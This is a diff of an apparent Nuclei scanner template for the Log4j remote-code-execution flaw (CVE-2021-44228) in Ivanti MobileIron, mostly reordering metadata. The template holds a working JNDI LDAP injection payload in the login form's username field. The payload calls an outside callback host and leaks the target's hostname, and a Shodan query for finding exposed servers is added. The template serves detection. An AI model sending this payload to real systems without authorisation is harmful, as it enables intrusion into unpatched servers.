@@ -1,5 +1,4 @@
 id: mobileiron-log4j-rce
-
 info:
   name: Ivanti MobileIron (Log4j) - Remote Code Execution
   author: meme-lord
@@ -8,10 +7,10 @@ info:
   remediation: From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.
   reference:
     - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
-    - https://www.lunasec.io/docs/blog/log4j-zero-day/
-    - https://www.zdnet.com/article/mobileiron-customers-urged-to-patch-systems-due-to-potential-log4j-exploitation/
     - https://logging.apache.org/log4j/2.x/security.html
     - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://www.zdnet.com/article/mobileiron-customers-urged-to-patch-systems-due-to-potential-log4j-exploitation/
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
@@ -20,54 +19,48 @@ info:
     cpe: cpe:2.3:a:ivanti:mobileiron:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
-    verified: true
     max-request: 1
+    product: mobileiron
+    shodan-query: http.html:"MobileIron"
     vendor: ivanti
-  tags: jndi,log4j,rce,cve,cve2021,ivanti,oast,mobileiron,kev,vuln
+    verified: true
+  tags: cve,cve2021,ivanti,jndi,kev,log4j,mobileiron,oast,rce,vuln
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
-
 http:
-  - raw:
+  - extractors:
+      - kval:
+          - interactsh_ip
+        type: kval
+      - group: 2
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+      - group: 1
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: location
+        type: word
+        words:
+          - /mifs/user/login.jsp?error=1
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         POST /mifs/j_spring_security_check HTTP/1.1
         Referer: {{RootURL}}/mifs/user/login.jsp
         Content-Type: application/x-www-form-urlencoded
 
         j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=password&logincontext=employee
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: location
-        words:
-          - '/mifs/user/login.jsp?error=1'
-
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
